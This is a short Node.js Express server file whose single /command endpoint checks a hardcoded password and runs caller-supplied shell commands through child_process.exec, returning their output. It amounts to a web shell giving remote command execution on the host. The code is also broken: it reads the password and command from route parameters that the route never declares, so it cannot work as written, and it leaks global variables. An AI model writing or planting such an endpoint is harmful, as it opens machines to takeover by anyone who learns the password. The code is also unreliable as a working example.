const express = require('express');
const { exec } = require('child_process');

const app = express();
app.use(express.json());

const port = process.env.PORT || 3000;

app.listen(port, () => {
    console.log("Server Listening on PORT:", port);
});


app.get("/command", (request, response) => {
    password = request.params.password
    console.log(password);
    if (password == null || password == "" || password == undefined || password == "undefined") {
        response.send("You need to give a password");
        return;
    }
    if (password.length != 12) {
        response.send("Password must be 12 characters long");
        return;
    }
    if (password != "yqta2ZQeZw56") {
        response.send("Wrong password");
        return;
    }
    command = request.params.data
    if (command == null || command == "" || command == undefined || command == "undefined") {
        response.send("You need to give a command");
        return;
    }

    commands = command.split(" && ")
    if (commands.length == 1) {
        for (let i = 0; i < commands.length; i++) {
            cmd = commands[i];
            exec(cmd, (error, stdout, stderr) => {
                if (error) {
                    console.error(`exec error: ${error}`);
                    response.send(`${error}`);
                    return;
                }
                response.send(`${stdout}`);
            });
        }
    } else {
        let resp = [];
        for (let i = 0; i < commands.length; i++) {
            cmd = commands[i];
            exec(cmd, (error, stdout, stderr) => {
                if (error) {
                    console.error(`exec error: ${error}`);
                    response.send(`${error}`);
                    return;
                }
                if (stdout == "") {
                    stdout = "Task Completed Successfully";
                }
                resp.push(`> ${commands[i]}\n${stdout}`);
                if (resp.length == commands.length) {
                    var respo = resp.join('')
                    response.send(respo);
                }
            });
        }
    }
});